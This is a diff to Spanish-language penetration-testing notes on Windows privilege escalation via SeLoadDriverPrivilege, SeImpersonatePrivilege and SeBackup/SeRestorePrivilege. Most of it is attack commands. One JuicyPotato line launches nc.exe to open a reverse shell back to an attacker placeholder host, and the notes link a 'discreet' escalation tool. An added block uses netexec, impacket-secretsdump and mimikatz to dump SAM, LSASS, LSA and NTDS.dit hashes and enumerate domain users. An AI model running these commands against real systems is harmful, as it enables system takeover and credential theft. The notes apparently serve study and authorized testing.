@@ -86,15 +86,16 @@ En los sistemas operativos Windows, los privilegios son permisos otorgados a las
 
 Cada uno de estos privilegios otorga la capacidad de realizar acciones concretas en el sistema que pueden influir en su configuración, seguridad y funcionamiento general. Los administradores del sistema deben gestionar y asignar estos privilegios con cuidado para garantizar la seguridad y el correcto desempeño de los sistemas Windows.
 
-## Privilegios Windows que llevan a SYSTEM
+# Privilegios Windows que llevan a SYSTEM
 
 ```bash 
 ❯ whoami /priv        # Muestra los privilegios del usuario actual 
 ❯ C:\Windows\System32\whoami.exe /priv 
 ```
 
+## SeLoadDriverPrivilege
 ```powershell 
-1. 'SeLoadDriverPrivilege' = Permite 'cargar drivers firmados' que se ejecutan con permisos del 'kernel (ring 0)'. Si puedes cargar un 'driver malicioso' (uno que eleva privilegios), te puedes convertir en 'NT AUTHORITY\SYSTEM' o incluso ejecutar código arbitrario en el núcleo
+Permite 'cargar drivers firmados' que se ejecutan con permisos del 'kernel (ring 0)'. Si puedes cargar un 'driver malicioso' (uno que eleva privilegios), te puedes convertir en 'NT AUTHORITY\SYSTEM' o incluso ejecutar código arbitrario en el núcleo
 
 
 Pasos:
@@ -115,8 +116,10 @@ Notas:
 	3. Para obtener la revershell se debe estar en escucha con 'Netcat'
 ```
 
+
+## SetImpersonatePrivilege
 ```powershell
-2. 'SetImpersonatePrivilege' = Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM
+Si un usuario tiene el privilegio antes mencionado se puede aprovechar para obtener acceso a nivel de SYSTEM
 
 IMPORTANTE --> CONOCER LA VERIÓN del SISTEMA OPERATIVO PARAA SABER QUE POTATO USAR <-- 
 ❯ systeminfo 
@@ -208,11 +211,17 @@ PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
 ❯ .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd IP_Kali 4444"
 ```
 
+
+## SeBackupPrivilege y SeRestorePrivilege
 ```powershell 
-3. 'SeBackupPrivilege y SeRestorePrivilege' = Son privilegios de Windows relacionados con las operaciones de Backup y Restore.
+Son privilegios de Windows relacionados con las operaciones de Backup y Restore.
 
 ## SeBackupPrivilege
 Permite realizar operaciones de backup sobre archivos y directorios aunque el usuario no tenga permisos NTFS de lectura normales sobre ellos.
+
+# Método Mejorado discreto 
+	https://github.com/ivancabrera02/SrHollow
+
 
 Esto puede permitir obtener copias de archivos protegidos del sistema como:
 
@@ -287,5 +296,30 @@ Pasos:
 ❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 ```
 
+```bash 
+# Dump All Hashes Remotamente: 
 
+## dump SAM - requires local admin
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --sam | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
 
+## dump LSASS - requires local admin
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M lsassy
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M nanodump | fgrep -v '[' | awk -F: '{print $2}' | tee -a dumped_hashes.txt
+
+## dump LSA - requires local admin
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa secdump
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes
+
+## Dump NTDS.dit - Requires domain admin or local admin on DC
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' -M ntdsutil | fgrep -v '[' | awk -F: '{print $4}' | tee -a dumped_hashes.txt
+impacket-secretsdump 'user1':'Password1!'@10.10.175.62 -just-dc-ntlm -outputfile test.txt
+
+## Get userlist of all users in the domain (do against dc to get all domain users):
+netexec smb 10.10.175.62 -u 'user1' -p 'Password1!' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\\' -f2 | tee users.txt
+
+## Recommended to dump with this too just in case. We wanna make sure we have all hashes:
+mimikatz | Hashdump
+```
